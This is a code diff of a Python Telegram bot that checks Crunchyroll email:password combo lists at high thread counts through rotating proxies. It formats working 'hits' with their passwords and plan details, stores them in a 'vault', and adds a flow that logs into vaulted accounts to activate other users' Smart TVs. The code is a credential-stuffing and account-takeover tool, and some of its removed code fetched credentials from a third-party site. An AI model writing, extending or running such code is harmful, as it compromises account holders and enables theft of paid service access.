         with self.lock:
             ids = list(self.settings.get("admin_ids", []) or [])
@@ -1526,59 +1439,6 @@ class Store:
                 self.save()
             return changed
 
-    def set_setting(self, key, value):
-        with self.lock:
-            self.settings[key] = value
-            self.save()
-
-    def has_access(self, uid: int):
-        with self.lock:
-            if uid in ADMIN_IDS:
-                return True, now_utc()
-            info = self.users.get(str(uid))
-            if info:
-                exp = parse_iso(info.get("expiry"))
-                if exp and exp > now_utc():
-                    return True, exp
-                self.users.pop(str(uid), None)
-                self.save()
-            return False, None
-
-    def redeem(self, code: str, uid: int):
-        """Returns an expiry datetime on success, or 'invalid' | 'used' | 'expired'."""
-        code = (code or "").strip().upper()
-        with self.lock:
-            data = self.codes.get(code)
-            if not data:
-                return "invalid"
-            if data.get("used_by") is not None:
-                return "used"
-            exp = parse_iso(data.get("expiry"))
-            if not exp or exp < now_utc():
-                self.codes.pop(code, None)
-                self.save()
-                return "expired"
-            data["used_by"] = uid
-            self.users[str(uid)] = {
-                "expiry": data.get("expiry"),
-                "premium_only": PREMIUM_ONLY_DEFAULT,
-            }
-            self.save()
-            return exp
-
-    def add_code(self, code: str, hours: int) -> datetime:
-        exp = now_utc() + timedelta(hours=hours)
-        with self.lock:
-            self.codes[code] = {"expiry": exp.isoformat(), "used_by": None}
-            self.save()
-        return exp
-
-    def set_premium_only(self, uid: int, val: bool):
-        with self.lock:
-            info = self.users.setdefault(str(uid), {})
-            info["premium_only"] = bool(val)
-            self.save()
-
     def get_premium_only(self, uid: int) -> bool:
         with self.lock:
             info = self.users.get(str(uid))
@@ -1586,60 +1446,44 @@ class Store:
                 return bool(info["premium_only"])
         return PREMIUM_ONLY_DEFAULT
 
-    def active_user_count(self) -> int:
-        with self.lock:
-            now = now_utc()
-            return sum(
-                1 for d in self.users.values()
-                if (parse_iso(d.get("expiry")) or datetime.min.replace(tzinfo=timezone.utc)) > now
-            )
 
 STORE: Optional[Store] = None
 
-# ===================== PROGRESS (thread-safe, BlazeNXT PREMIUM bar) =====================
+
+# ===================== PROGRESS & FORMATTING =====================
 def _bar(pct: int, width: int = 20) -> str:
     filled = int(pct / 100 * width)
     return "█" * filled + "░" * (width - filled)
+
 
 def _live_feed_block(res: dict) -> str:
     feed = res.get("live_feed") or []
     if not feed:
         return "  <i>—</i>"
-    # show last 3
-    last = feed[-3:]
-    return "\n".join(f"  {esc(x)}" for x in last)
+    return "\n".join(f"  {esc(x)}" for x in feed[-3:])
+
 
 def progress_text(res: dict) -> str:
     total = res.get("total") or 0
     processed = res.get("processed", 0)
-    # Premium: show one decimal for <10% to match BlazeNXT screenshot 0.6%
     raw_pct = (processed / total * 100) if total else 0
-    if raw_pct < 10 and raw_pct != 0:
-        pct_str = f"{raw_pct:.1f}"
-        pct = int(raw_pct)  # for bar
-    else:
-        pct_str = str(int(raw_pct))
-        pct = int(raw_pct)
-    # CPM / elapsed / ETA premium
+    pct_str = f"{raw_pct:.1f}" if (raw_pct < 10 and raw_pct != 0) else str(int(raw_pct))
+    pct = int(raw_pct)
     elapsed = res.get("elapsed") or (time.time() - res.get("t0", time.time())) if res.get("t0") else 0
     cpm = res.get("cpm") if res.get("cpm") is not None else _fmt_cpm(processed, elapsed)
     eta = _fmt_eta(total, processed, cpm)
     elapsed_s = _fmt_duration(elapsed) if elapsed else "0m 0s"
     twofa = res.get("twofa", 0)
-    # Keep legacy first two lines EXACT for backward-compat tests, then add premium block
-    legacy = (
-        f"⏳ Crunchyroll {pct_str}% [{_bar(pct)}] ({processed}/{total})\n"
-        f"✅ Hits: {len(res.get('hits', []))} | 🆓 Free: {len(res.get('free', []))} | "
-        f"❌ Bad: {res.get('bad',0)} | ⏳ Rate: {res.get('rate',0)} | ⚠️ Errors: {res.get('err',0)}"
-    )
-    # Detailed: success rate
-    success_rate = (len(res.get('hits', [])) / processed * 100) if processed else 0
-    premium = (
+    success_rate = (len(res.get("hits", [])) / processed * 100) if processed else 0
+
+    return (
         f"╭────────────────────────╮\n"
         f"│ 📈 <b>CRUNCHYROLL — LIVE</b> │\n"
         f"╰────────────────────────╯\n"
         f"━━━━━━━━━━━━━━━━━━━━━\n"
-        f"{legacy}\n"
+        f"⏳ Crunchyroll {pct_str}% [{_bar(pct)}] ({processed}/{total})\n"
+        f"✅ Hits: {len(res.get('hits', []))} | 🆓 Free: {len(res.get('free', []))} | "
+        f"❌ Bad: {res.get('bad', 0)} | ⏳ Rate: {res.get('rate', 0)} | ⚠️ Errors: {res.get('err', 0)}\n"
         f"🔐 2FA: <code>{twofa}</code> | 🌐 Proxies: <code>{proxy_count()}</code> | ✅ Rate: <code>{success_rate:.1f}%</code>\n"
         f"━━━━━━━━━━━━━━━━━━━━━\n"
         f"📈 <code>{cpm} cpm</code>  🕒 <code>{elapsed_s}</code>  ⏳ ETA <code>{eta}</code>\n"
@@ -1647,11 +1491,9 @@ def progress_text(res: dict) -> str:
         f"📡 <b>Live feed:</b>\n"
         f"{_live_feed_block(res)}"
     )
-    return premium
+
 
 class ProgressReporter:
-    """Updates a Telegram message from worker threads without blocking."""
-
     def __init__(self, message, loop: asyncio.AbstractEventLoop, interval: float = 1.8):
         self.message = message
         self.loop = loop
@@ -1673,7 +1515,7 @@ class ProgressReporter:
     async def _edit(self, text: str):
         try:
             await self.message.edit_text(text, parse_mode=ParseMode.HTML)
-        except BadRequest:  # "message is not modified" etc. — safe to ignore
+        except BadRequest:
             pass
         except Exception:
             pass
@@ -1686,250 +1528,125 @@ class ProgressReporter:
                 pass
         self.tasks.clear()
 
-# ===================== FORMATTING — BlazeNXT PREMIUM =====================
-def access_denied_html() -> str:
-    return (
-        "✅ <b>Free Bot</b>\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        "This bot is FREE — no code needed!\n"
-        "Just tap <b>💎 Check Account</b> to start.\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        f"👤 Owner: <code>{esc(OWNER_USERNAME)}</code>"
-    )
 
 def hit_card(entry: dict) -> str:
-    """⭐ CRUNCHYROLL HIT! — compact attractive (user requested)"""
     cred, d = entry["cred"], entry.get("data") or {}
-    L = []
-    L.append("⭐ <b>CRUNCHYROLL HIT!</b>")
-    L.append("━━━━━━━━━━━━━━━━━━━━━")
+    L = [
+        "⭐ <b>CRUNCHYROLL HIT!</b>",
+        "━━━━━━━━━━━━━━━━━━━━━",
+    ]
     if cred["type"] == "email":
         L.append(f"📧 Email: <code>{esc(cred['value'])}</code>")
         L.append(f"🔑 Password: <code>{esc(cred.get('password', ''))}</code>")
     else:
         L.append(f"🔑 {cred['type'].title()}: <code>{esc(cred['value'][:60])}</code>")
     L.append("━━━━━━━━━━━━━━━━━━━━━")
-    plan = d.get("plan") or "Premium"
-    L.append(f"• Plan: <code>{esc(plan)}</code>")
-    L.append(f"• Premium: ✅")
-    if d.get("expiry") or d.get("next_renewal"):
-        L.append(f"• Expiry: <code>{esc(d.get('expiry') or d.get('next_renewal') or 'N/A')}</code>")
-    if d.get("days_left"):
+    L.append(f"• Plan: <code>{esc(d.get('plan') or 'Premium')}</code>")
+    L.append("• Premium: ✅")
+    if d.get("expiry"):
+        L.append(f"• Expiry: <code>{esc(d.get('expiry'))}</code>")
+    if d.get("days_left") and d.get("days_left") != "N/A":
         L.append(f"• Days Left: <code>{esc(str(d.get('days_left')))}</code>")
     L.append(f"• Auto Renew: {'✅' if d.get('renew') else '❌'}")
     L.append(f"• Free Trial: {'✅' if d.get('trial') else '❌'}")
-    if d.get("duration") or d.get("billing_cycle"):
-        L.append(f"• Plan Duration: <code>{esc(d.get('duration') or d.get('billing_cycle') or 'N/A')}</code>")
+    if d.get("duration"):
+        L.append(f"• Plan Duration: <code>{esc(d.get('duration'))}</code>")
     price = str(d.get("price") or "0")
     if d.get("currency"):
         price += f" {d.get('currency')}"
     L.append(f"• Plan Price: <code>{esc(price.strip())}</code>")
-    if d.get("plan_type"):
-        L.append(f"• Plan Type: <code>{esc(d.get('plan_type'))}</code>")
-    L.append(f"• Email Verified: {'✅' if d.get('verified') else '❌'}")
-    if d.get("created") or d.get("start_date"):
-        L.append(f"• Created Date: <code>{esc(d.get('created') or d.get('start_date') or 'N/A')}</code>")
-    if d.get("payment") or d.get("payment_method"):
-        L.append(f"• Last Payment: <code>{esc(d.get('payment') or d.get('payment_method') or 'N/A')}</code>")
     if d.get("cc") or d.get("country_name"):
         flag = flag_emoji(d.get("cc"))
         country = d.get("country_name") or d.get("cc") or "N/A"
         L.append(f"• Country: {flag + ' ' if flag else ''}<code>{esc(country)}</code>")
     if d.get("streams"):
         L.append(f"• Streams: <code>{esc(str(d.get('streams')))}</code>")
-    if d.get("user") and d["user"] != (cred.get("value", "").split("@")[0] if cred.get("value") else ""):
-        L.append(f"• User: <code>{esc(d.get('user'))}</code>")
-    if d.get("sub_id"):
-        L.append(f"• Sub ID: <code>{esc(d.get('sub_id')[:20])}</code>")
     L.append("━━━━━━━━━━━━━━━━━━━━━")
     L.append("🔥 <b>CRUNCHYROLL</b>")
-    L.append(DEVELOPER_BRANDING)
     return "\n".join(L)
 
+
 def summary_text(res: dict) -> str:
-    # Keep legacy lines for compat, wrap in premium header/footer
-    hits = len(res.get('hits', []))
-    free = len(res.get('free', []))
-    bad = res.get('bad', 0)
-    rate = res.get('rate', 0)
-    err = res.get('err', 0)
-    twofa = res.get('twofa', 0)
-    total = res.get('total', 0)
-    processed = res.get('processed', 0)
-    sec = res.get('seconds', '?')
-    cpm = res.get('cpm', 0)
-    elapsed = res.get('elapsed', 0)
-    if not cpm and elapsed:
-        cpm = _fmt_cpm(processed, elapsed)
-    # legacy block (must stay exactly for tests)
-    legacy = (
-        f"📊 Total: <code>{total}</code> | Processed: <code>{processed}</code>\n"
-        f"✅ Hits: <code>{hits}</code> | 🆓 Free: <code>{free}</code> | "
-        f"❌ Bad: <code>{bad}</code>\n"
-        f"⏳ Rate: <code>{rate}</code> | ⚠️ Errors: <code>{err}</code>\n"
-        f"⏱ Time: <code>{sec}s</code> | 🌐 Live Proxies: <code>{proxy_count()}</code>"
-    )
-    # premium wrapper - BlazeNXT clean (no tagline if user chose no_tagline, but keep BlazeNXT branding)
-    extra = f"🔐 2FA: <code>{twofa}</code> | 📈 Avg: <code>{cpm} cpm</code>" if twofa or cpm else ""
-    extra_block = f"{extra}\n" if extra else ""
-    # Detailed breakdown
-    detailed = ""
-    if res.get("hits"):
-        # Plan breakdown
-        from collections import Counter
-        plans = Counter((h.get("data") or {}).get("plan") or "Premium" for h in res.get("hits", []))
-        plan_line = " • ".join(f"{esc(k)}: <code>{v}</code>" for k,v in plans.items())
-        # Country breakdown (top 3)
-        ccs = Counter((h.get("data") or {}).get("country_name") or (h.get("data") or {}).get("cc") or "Unknown" for h in res.get("hits", []))
-        cc_line = " • ".join(f"{esc(k)}: <code>{v}</code>" for k,v in ccs.most_common(3))
-        # Success rate
-        total = res.get("total", 0) or 1
-        rate = len(res.get("hits", [])) / total * 100
-        detailed = (
-            f"📊 Plans: {plan_line}\n"
-            f"🌍 Countries: {cc_line}\n"
-            f"✅ Success: <code>{rate:.1f}%</code> • ⏱ Avg: <code>{res.get('cpm',0)} cpm</code>\n"
-        )
+    hits = len(res.get("hits", []))
+    free = len(res.get("free", []))
+    bad = res.get("bad", 0)
+    rate = res.get("rate", 0)
+    err = res.get("err", 0)
+    twofa = res.get("twofa", 0)
+    total = res.get("total", 0)
+    processed = res.get("processed", 0)
+    sec = res.get("seconds", "?")
+    cpm = res.get("cpm", 0)
     return (
         "╭────────────────────────╮\n"
         "│ ✅ <b>SCAN COMPLETE!</b> │\n"
         "╰────────────────────────╯\n"
         "━━━━━━━━━━━━━━━━━━━━━\n"
-        f"{legacy}\n"
-        f"{extra_block}"
-        f"{detailed}"
+        f"📊 Total: <code>{total}</code> | Processed: <code>{processed}</code>\n"
+        f"✅ Hits: <code>{hits}</code> | 🆓 Free: <code>{free}</code> | ❌ Bad: <code>{bad}</code>\n"
+        f"⏳ Rate: <code>{rate}</code> | 🔐 2FA: <code>{twofa}</code> | ⚠️ Errors: <code>{err}</code>\n"
+        f"⏱ Time: <code>{sec}s</code> | 📈 Avg: <code>{cpm} cpm</code> | 🗄️ Vault: <code>{vault_count()}</code>\n"
         "━━━━━━━━━━━━━━━━━━━━━\n"
-        "🔥 <b>CRUNCHYROLL</b>\n"
-        f"{DEVELOPER_BRANDING}"
+        "🔥 <b>CRUNCHYROLL</b>"
     )
 
+
 def status_text() -> str:
-    ac = bool(STORE.get_setting("auto_check", True)) if STORE else True
     return (
         "📊 <b>Bot Status</b>\n"
         "━━━━━━━━━━━━━━━━━━━━━\n"
         f"👑 Owner: <code>{esc(OWNER_USERNAME)}</code>\n"
+        f"🗄️ Vault Accounts: <code>{vault_count()}</code>\n"
         f"🌐 Live Proxies: <code>{proxy_count()}</code> | Pool: <code>{pool_size()}</code>\n"
-        f"⚙️ Auto-Check Proxies: <code>{'ON' if ac else 'OFF'}</code>\n"
-        f"👥 Active Users: <code>{STORE.active_user_count() if STORE else 0}</code>\n"
         f"🧵 Threads: <code>{THREADS}</code>\n"
-        f"🔁 Proxy Refresh: <code>{PROXY_REFRESH_MINUTES} min</code>\n"
         f"⏱ Uptime: <code>{uptime()}</code>\n"
         f"✅ Checks This Session: <code>{CHECKS_DONE}</code>\n"
-        f"🧩 SOCKS5: <code>{'Yes' if SOCKS5_OK else 'No (missing pysocks)'}</code>\n"
-        f"💎 Default Mode: <code>{'Premium Only' if PREMIUM_ONLY_DEFAULT else 'All Working'}</code>\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        f"{DEVELOPER_BRANDING}"
+        "━━━━━━━━━━━━━━━━━━━━━"
     )
+
 
 def help_text() -> str:
     return (
-        "╭────────────────────────╮\n"
-        "│  📖 <b>HELP</b>  │\n"
-        "╰────────────────────────╯\n"
-        "🔥 <b>Crunchyroll Checker</b> — Powerful, Secure, Fast\n"
+        "📖 <b>CRUNCHYROLL BOT HELP</b>\n"
         "━━━━━━━━━━━━━━━━━━━━━\n"
-        "👑 <b>Owner + Admins Only</b> • 24x7 Auto Proxy • 500 Threads • Smart Scoring\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        "┌─ <b>🚀 QUICK START</b> ──────────┐\n"
-        "│ 💎 <b>Check Account</b> → Paste <code>EMAIL:PASS</code>\n"
-        "│   └ One per line • Ex: <code>a@b.com:pass123</code>\n"
-        "│ 📂 <b>Check File</b> → Send <code>.txt/.csv/.log/.json</code>\n"
-        "│   └ Auto-extracts 10k+ lines 📦\n"
-        "│ ⏳ LIVE scan → Hits <b>instant</b> ⚡ + <code>TXT+JSON</code> export\n"
-        "└────────────────────────┘\n"
-        "┌─ <b>🎛️ BUTTONS</b> ─────────────┐\n"
-        "│ 💎 Check Account • 📂 Check File\n"
-        "│ 📖 How To Use • 📊 Bot Stats\n"
-        "│ ⚙️ Proxy Settings (Proxies/Threads/Auto)\n"
-        "│ 👥 Admins (Owner only: Add/Remove)\n"
-        "└────────────────────────┘\n"
-        "┌─ <b>⌨️ COMMANDS</b> ────────────┐\n"
-        "│ <code>/start</code> — Main menu\n"
-        "│ <code>/cmds</code> / <code>/help</code> — This help\n"
-        "│ <code>/proxy</code> — Proxy Settings\n"
-        "│ <code>/addproxy</code> — Upload proxies (text/file)\n"
-        "│ <code>/clearproxy</code> — Clear pool\n"
-        "│ <code>/threads</code> — Set 50/100/200/300/500\n"
-        "│ <code>/autoproxy</code> — Toggle 24x7 auto\n"
-        "│ <code>/admins</code> — List admins\n"
-        "│ <code>/addadmin 123</code> / <code>@user</code> — Owner\n"
-        "│ <code>/removeadmin 123</code> / <code>@user</code>\n"
-        "└────────────────────────┘\n"
-        "┌─ <b>⚙️ PROXY SYSTEM</b> ────────┐\n"
-        "│ ♻️ Auto: 12 sources, 5min, 100 live, watchdog 45s\n"
-        "│ 📥 Manual: <code>ip:port</code> / <code>user:pass@ip:port</code>\n"
-        "│   Text paste or .txt file — auto-detect\n"
-        "│ 🧵 Threads 50/100/200/300/500 • Smart scoring\n"
-        "└────────────────────────┘\n"
-        "┌─ <b>🎯 CHECKER</b> ────────────┐\n"
-        "│ 150 default → 500 max • 800-1000 cpm\n"
-        "│ Deep: Fan/Mega/Ultimate • Expiry/Price/Trial\n"
-        "│ 2FA/Rate/Errors handled • Instant hits\n"
-        "└────────────────────────┘\n"
-        "╭────────────────────────╮\n"
-        "│  🔥 <b>CRUNCHYROLL</b> • Powerful • Secure • Fast  │\n"
-        "╰────────────────────────╯\n"
-        f"{DEVELOPER_BRANDING} • 👤 Owner: <code>{esc(OWNER_USERNAME)}</code>"
+        "📺 <b>Smart TV Login:</b>\n"
+        "• Send <code>/tv ABCD12</code> (6-char code on your TV)\n"
+        "• Or tap <b>📺 TV Login</b> button\n\n"
+        "👑 <b>Admin / Vault Commands:</b>\n"
+        "• <code>/upload</code> — Reply to <code>.zip/.txt/.json</code> file to scan & save hits to vault\n"
+        "• <code>/vault</code> — View saved accounts in vault\n"
+        "• <code>/clearvault</code> — Empty the vault\n"
+        "• <code>/proxy</code> — Proxy & Thread settings\n"
+        "• <code>/admins</code> — Manage admins\n"
+        "━━━━━━━━━━━━━━━━━━━━━"
     )
 
-def welcome_premium_text(uid: int, name: str) -> str:
-    # FREE MODE UI — clean, modern, no subscription gate
-    is_owner = is_admin(uid)
-    if is_owner:
-        access_line = "👑 <b>Owner</b> • <code>Unlimited</code> ♾️"
-    else:
-        access_line = "✅ <b>Free Access</b> • <code>Unlimited</code> 🎉"
-    # Fancy header with stats
+
+def welcome_premium_text(uid: int, name: str, username: str = None) -> str:
+    admin = is_admin(uid, username)
+    role_line = "👑 <b>Owner / Admin</b> • <code>Unlimited</code> ♾️" if admin else "✅ <b>Public User</b> • <code>TV Login Ready</code> 📺"
     return (
         "╭────────────────────────╮\n"
         "│  🔥 <b>CRUNCHYROLL</b> 🔥  │\n"
-        "│  <i>Premium Checker • FREE</i>   │\n"
+        "│  <i>Checker • Vault • TV</i>   │\n"
         "╰────────────────────────╯\n"
         f"👋 Hey <b>{esc(name)}</b>\n"
-        f"{access_line}\n"
+        f"{role_line}\n"
         "┌─ <b>STATS</b> ────────────────┐\n"
-        f"│ 🌐 Proxies: <code>{proxy_count()} live</code> • 📦 Pool: <code>{pool_size()}</code>\n"
-        f"│ 👥 Users: <code>{STORE.active_user_count() if STORE else 0}</code> • 🧵 Threads: <code>{THREADS}</code> (max 500)\n"
+        f"│ 🗄️ Vault: <code>{vault_count()} accounts</code>\n"
+        f"│ 🌐 Proxies: <code>{proxy_count()} live</code> • 🧵 Threads: <code>{THREADS}</code>\n"
         f"│ ⏱ Uptime: <code>{uptime()}</code> • ✅ Checks: <code>{CHECKS_DONE}</code>\n"
         "└────────────────────────┘\n"
-        "👇 <i>Choose an action — buttons below</i> 👇\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        f"{DEVELOPER_BRANDING}"
+        "📺 <i>Send</i> <code>/tv ABCD12</code> <i>to pair your Smart TV!</i>\n"
+        "━━━━━━━━━━━━━━━━━━━━━"
     )
 
-# ===================== BUTTON MENUS (Bot API 9.4 colored JSON) =====================
-# style: "primary" (blue) | "success" (green) | "danger" (red)
-# icon_custom_emoji_id: colored custom-emoji icon on the button
-# If Telegram rejects either field, we auto-fall back (icons off, then styles off,
-# then plain buttons) so the menu can NEVER break.
-CUSTOM_EMOJI_ID = "5319302927281177662"  # official Bot API docs example (green check)
-_CAPS = {"icon": None, "style": None}  # None = untested, False = rejected, True = ok
-# ────────────────── Premium Emoji (BlazeNXT — ULTRA LEGENDRY) ──────────────────
-# All unicode emojis are replaced with premium custom-emoji IDs from @fStikBot / @TgEmojis
-# Provided by user: ~600 IDs. Mapping below covers every emoji used in BlazeNXT.
-# Button icons use icon_custom_emoji_id, message emojis use  tags.
-PREMIUM_EMOJI = {}  # removed — single checker plain
 
-def _premium_wrap(text: str) -> str:
-    return text
-def _premium_wrap_disabled(text: str) -> str:
-    return text
+# ===================== BUTTON MENUS =====================
+_CAPS = {"style": None}
 
-def _premium_icon(label: str) -> str | None:
-    """Pick best premium icon ID for a button label (first emoji found)."""
-    for uni in sorted(PREMIUM_EMOJI, key=len, reverse=True):
-        if uni in label:
-            return PREMIUM_EMOJI[uni]
-    return None
-
-# BlazeNXT ribbon brand
-BLAZENXT_RIBBON = ""
-BLAZENXT_BRAND = "<b>BlazeNXT</b>"
-DEVELOPER_BRANDING = 'Developed by : <a href="https://t.me/blaze_nxt">BlazeNXT</a>'  # @blaze_nxt username deeplink
 
 def _build_kb(rows) -> InlineKeyboardMarkup:
-    """rows: list of rows; each row = list of (label, cb) or (label, cb, style). Supports url buttons."""
     use_style = _CAPS["style"] is not False
     data = []
     for row in rows or []:
@@ -1941,9 +1658,8 @@ def _build_kb(rows) -> InlineKeyboardMarkup:
             cb = item[1] if len(item) > 1 else None
             style = item[2] if len(item) > 2 else None
             kwargs = {}
-            # url buttons don't support style in some clients, so skip style for url
-            is_url = isinstance(cb, str) and (cb.startswith("tg://") or cb.startswith("https://") or cb.startswith("http://"))
-            if style and use_style and style in ("primary","success","danger") and not is_url:
+            is_url = isinstance(cb, str) and cb.startswith(("tg://", "https://", "http://"))
+            if style and use_style and style in ("primary", "success", "danger") and not is_url:
                 kwargs["style"] = style
             if is_url:
                 line.append(InlineKeyboardButton(label, url=cb, **kwargs))
@@ -1953,11 +1669,9 @@ def _build_kb(rows) -> InlineKeyboardMarkup:
             data.append(line)
     return InlineKeyboardMarkup(data)
 
+
 async def _send_menu(msg, text: str, rows, edit: bool) -> bool:
-    """Send/edit a message with a button menu. Graceful degradation of 9.4 fields."""
-    text = text
-    for _attempt in range(4):
-        use_icon = _CAPS["icon"] is not False
+    for _ in range(3):
         use_style = _CAPS["style"] is not False
         kb = _build_kb(rows)
         try:
@@ -1965,8 +1679,6 @@ async def _send_menu(msg, text: str, rows, edit: bool) -> bool:
                 await msg.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
             else:
                 await msg.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
-            if use_icon:
-                _CAPS["icon"] = True
             if use_style:
                 _CAPS["style"] = True
             return True
@@ -1974,9 +1686,6 @@ async def _send_menu(msg, text: str, rows, edit: bool) -> bool:
             s = str(e).lower()
             if "message is not modified" in s:
                 return True
-            if use_icon and ("emoji" in s or "icon" in s):
-                _CAPS["icon"] = False
-                continue
             if use_style and "style" in s:
                 _CAPS["style"] = False
                 continue
@@ -1984,86 +1693,61 @@ async def _send_menu(msg, text: str, rows, edit: bool) -> bool:
             return False
     return False
 
+
 async def reply_menu(msg, text, rows):
     return await _send_menu(msg, text, rows, edit=False)
+
 
 async def edit_menu(msg, text, rows):
     return await _send_menu(msg, text, rows, edit=True)
 
-# ===================== REPLY KEYBOARD COMPLETELY REMOVED =====================
-# No board at all — inline only. Old board removed via ReplyKeyboardRemove.
-def _build_reply_kb(rows, resize=True, one_time=False):
-    return None
-def main_reply_kb(is_owner: bool):
-    return None
-def owner_reply_kb():
-    return None
-def gen_reply_kb():
-    return None
-REPLY_TEXT_MAP = {}
-
-async def _send_reply_menu(msg, text: str, reply_kb, inline_rows=None):
-    # removed — inline only
-    return False
-async def _edit_or_send_reply(msg, text: str, reply_kb):
-    return False
 
 PENDING: Dict[int, dict] = {}
 PENDING_LOCK = threading.Lock()
+
 
 def set_pending(uid: int, kind: str, **kw):
     with PENDING_LOCK:
         PENDING[uid] = {"kind": kind, **kw}
 
+
 def get_pending(uid: int):
     with PENDING_LOCK:
         return PENDING.get(uid)
+
 
 def clear_pending(uid: int):
     with PENDING_LOCK:
         PENDING.pop(uid, None)
 
-def _has_access(uid: int) -> bool:
-    # Owner + admins only
-    return is_admin(uid)
 
-def _is_owner(uid: int, username: str = None) -> bool:
-    return is_admin(uid, username)
-
-# ===================== MENU DEFINITIONS — BlazeNXT =====================
-# Clean Crunchyroll-only menu (no AIO grid) — BlazeNXT
-# Keep AIO_SERVICES definition for backward compat but not used in crunchy_only mode
-AIO_SERVICES = [
-    [("🍥 CRUNCHYROLL", "check", "success")],
-]
-
-def menu_main(uid: int):
-    # JUST CHECKER — minimal 2x2 + Proxy Settings
-    try:
-        header = welcome_premium_text(uid, str(uid))
-    except Exception:
-        header = "╭────────────────────────╮\n│  🔥 <b>CRUNCHYROLL</b> 🔥  │\n╰────────────────────────╯"
-    rows = [
-        [("💎 Check Account", "check", "success"), ("📂 Check File", "file", "primary")],
-        [("📖 How To Use", "help", "primary"), ("📊 Bot Stats", "status", "primary")],
-        [("⚙️ Proxy Settings", "proxysettings", "primary")],
-    ]
-    if uid == OWNER_ID:
-        rows.append([("👥 Admins", "admins", "primary")])
+def menu_main(uid: int, username: str = None):
+    header = welcome_premium_text(uid, str(uid), username)
+    if is_admin(uid, username):
+        rows = [
+            [("📺 TV Login", "tv_prompt", "success"), ("🗄️ Vault", "vault_view", "primary")],
+            [("💎 Check Account", "check", "success"), ("📂 Check / Upload File", "file", "primary")],
+            [("📖 Help", "help", "primary"), ("📊 Bot Stats", "status", "primary")],
+            [("⚙️ Proxy Settings", "proxysettings", "primary")],
+        ]
+        if uid == OWNER_ID:
+            rows.append([("👥 Admins", "admins", "primary")])
+    else:
+        rows = [
+            [("📺 TV Login", "tv_prompt", "success"), ("📖 Help", "help", "primary")],
+            [("📊 Status", "status", "primary")],
+        ]
     return header, rows
 
+
 def menu_owner():
-    # JUST CHECKER — Proxy Settings only
     auto_on = bool(STORE.get_setting("auto_proxy", True)) if STORE else True
     header = (
-        "⚙️ <b>Proxy Settings — Auto Load 100x Fast</b>\n"
+        "⚙️ <b>Proxy Settings</b>\n"
         "━━━━━━━━━━━━━━━━━━━━━\n"
         f"📊 Status: <code>{'ON' if proxy_count() else 'OFF'}</code> • 📦 Pool: <code>{pool_size()}</code> • 🌐 Live: <code>{proxy_count()}</code>\n"
-        f"🔄 Auto Load: <code>{'ON' if auto_on else 'OFF'}</code> • 🧵 Threads: <code>{THREADS}</code> (max 500)\n"
-        f"⚡ Speed: <code>100x Fast</code> • 1:1 Proxy per Account\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        "Format: <code>user:pass@ip:port</code> or <code>ip:port</code>\n"
-        "Auto: 12 sources • Manual: text/file"
+        f"🔄 Auto Load: <code>{'ON' if auto_on else 'OFF'}</code> • 🧵 Threads: <code>{THREADS}</code>\n"
+        "━━━━━━━━━━━━━━━━━━━━━"
     )
     rows = [
         [("🔄 Refresh Auto", "refresh", "primary"), ("📥 Upload Proxies", "addpx", "success")],
@@ -2073,53 +1757,148 @@ def menu_owner():
     ]
     return header, rows
 
-# ===================== TV / OXAAM WORKERS =====================
-def _tv_do(email, pw, code):
-    j, st = app_login(email, pw)
-    if not j:
-        return False, f"login_failed ({st})"
-    return activate_tv(j["access_token"], code)
 
-def _oxaam_do():
-    # Use proxy for oxaam fetch as well (helps on Railway)
-    proxy = get_random_proxy() if "get_random_proxy" in globals() else None
-    email, pw = oxaam_fetch(proxy)
-    # Fallback: try without proxy if first failed
-    if (not email or not pw) and proxy:
-        logger.info("Oxaam retry without proxy")
-        email, pw = oxaam_fetch(None)
-    if not email or not pw:
-        return None, None, None
-    # Verify the credential via checker (use random proxy for check)
-    try:
-        r = check_credential({"type": "email", "value": email, "password": pw}, get_random_proxy())
-    except Exception as e:
-        r = {"st": "err", "data": {"info": str(e)}}
-    return email, pw, r
+# ===================== SMART TV ACTIVATION FLOW =====================
+def _process_tv_activation(code: str) -> dict:
+    """Picks an account from vault, obtains bearer token, and activates TV."""
+    ensure_proxies()
+    vault = load_vault()
+    if not vault:
+        return {"success": False, "error": "no_accounts"}
 
-def _oxaam_report(email, pw, res) -> str:
-    head = f"🔐 <code>{esc(email)}:{esc(pw)}</code>\n\n"
-    if res and res.get("st") == "hit":
-        return head + hit_card({"cred": {"type": "email", "value": email, "password": pw},
-                                "data": res["data"]})
-    st = (res or {}).get("st", "err") if res else "no_cred"
-    info = (res or {}).get("data", {}).get("info", "") if res else "oxaam_empty"
-    # More user-friendly error
-    if st == "no_cred" or not email:
-        return (
-            "❌ <b>Oxaam Fetch Failed</b>\n"
-            "━━━━━━━━━━━━━━━━━━━━━\n"
-            "⚠️ Could not extract from Oxaam.\n"
-            "• Site may be slow or blocked — try again in 30s\n"
-            "• Try <b>📡 Refresh Proxies</b> then retry\n"
-            "• Or use <b>💎 Check Account</b> with your own combos\n"
-            "━━━━━━━━━━━━━━━━━━━━━\n"
-            f"🔍 Debug: <code>{esc(info) or 'no_html'}</code>\n"
-            "🔥 <b>CRUNCHYROLL</b> 🎀"
+    # Prefer newest entries first
+    candidates = list(reversed(vault))
+    attempts = 0
+    max_attempts = min(5, len(candidates))
+
+    for entry in candidates[:max_attempts]:
+        attempts += 1
+        cred = entry.get("cred") or {}
+        data = entry.get("data") or {}
+        proxy = get_random_proxy()
+        ctype = cred.get("type")
+
+        bearer = None
+        if ctype == "email":
+            j, st = app_login(cred.get("value", ""), cred.get("password", ""), proxy)
+            if j and j.get("access_token"):
+                bearer = j["access_token"]
+            elif st == "bad":
+                remove_from_vault(cred)
+                continue
+            else:
+                continue
+        elif ctype == "cookie":
+            j, err = etp_rt_to_token(cred.get("value", ""), proxy)
+            if j and j.get("access_token"):
+                bearer = j["access_token"]
+            else:
+                remove_from_vault(cred)
+                continue
+        elif ctype == "token":
+            tok = cred.get("value", "")
+            if is_token_expired(tok):
+                remove_from_vault(cred)
+                continue
+            bearer = tok
+
+        if not bearer:
+            continue
+
+        ok, err = activate_tv(bearer, code, proxy)
+        if ok:
+            return {
+                "success": True,
+                "plan": data.get("plan") or "Premium",
+                "country": data.get("country_name") or data.get("cc") or "Unknown",
+                "cc": data.get("cc") or "",
